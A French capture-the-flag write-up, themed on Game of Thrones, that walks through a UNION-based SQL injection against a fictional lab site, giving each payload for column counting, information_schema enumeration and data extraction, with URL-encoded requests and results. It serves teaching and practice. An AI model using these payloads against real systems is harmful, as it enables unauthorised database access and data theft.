---
title: CWE-89 - Injection SQL UNION
next: "/write-ups/wu4"
prev: "/write-ups/wu2"
---

# 🗂️ Injection SQL (CWE-89) UNION

## 🎯 Objectif
Grâce au passe récupéré, John infiltre Castral-Roc et découvre un livre verrouillé répertoriant les armes Lannister. Grâce à une injection SQL Union, il y accède et trouve la localisation du feu grégeois, une menace pour la flotte des Stark.

**Flag attendu :** ville:emplacement

---

## ⚙️ Environnement
- **Prérequis :** Etre connecté avec le cookie de session du garde

---

## 🚀 Étape 1 : Déterminer le nombre de colonne de la bdd : 

```sql
' ORDER BY 1 --
```

Ne pas oublier d'encoder l'url : 
**?member=%27+ORDER+BY+1+--+**
Donc :
http://castral-roc.lannisport.south/famillelannister.php?member=%27+ORDER+BY+1+--+

On incrémente le nombre jusqu'a obtenir une erreur, dans notre cas lorsque l'on rentre 3 nous otenons une erreur, ansi le nombre de colonne est le dernier chiffre valide donc 2.

---

## Étape 2 : Identifier les colonnes visibles

```sql
' UNION SELECT 1,2 --
```

Une fois l'url encodée : 
http://castral-roc.lannisport.south/famillelannister.php?member=%27+UNION+SELECT+1,2+--+

Ici si nous la bdd nous retourne 1:2 cela indique que nous pouvons exploiter les colonnes 

---

## Étape 3 : Déterminer le nom des tables de la bdd 

```sql
' UNION SELECT table_name,table_schema FROM information_schema.tables --
```

Encodé : 
http://castral-roc.lannisport.south/famillelannister.php?member=%27+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+--+

On trouve ici : 

**battle_ressources : lannisport_db**

**lannister_family : lannisport_db**

---

## Étape 4 : Déterminer le nom des colonnes de la table battle_ressources 

```sql
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='battle_ressources' --
```

http://castral-roc.lannisport.south/famillelannister.php?member='+UNION+SELECT+column_name,data_type+FROM+information_schema.columns+WHERE+table_name='battle_ressources'+--+

On trouve : 

**emplacement : varchar**

**id : int**

**type : varchar**

**ville : varchar**

---

## Étape 5 : Extraire l'emplacement du Feu Grégoire
```sql
' UNION SELECT type, CONCAT(ville,' ' ,emplacement) FROM+battle_ressources -- 
```

http://castral-roc.lannisport.south/famillelannister.php?member='+UNION+SELECT+type,+CONCAT(ville,'+',emplacement)+FROM+battle_ressources+--+

On trouve alors : 

Feu Grégeois : Castral Roc Cave secrète sous la forteresse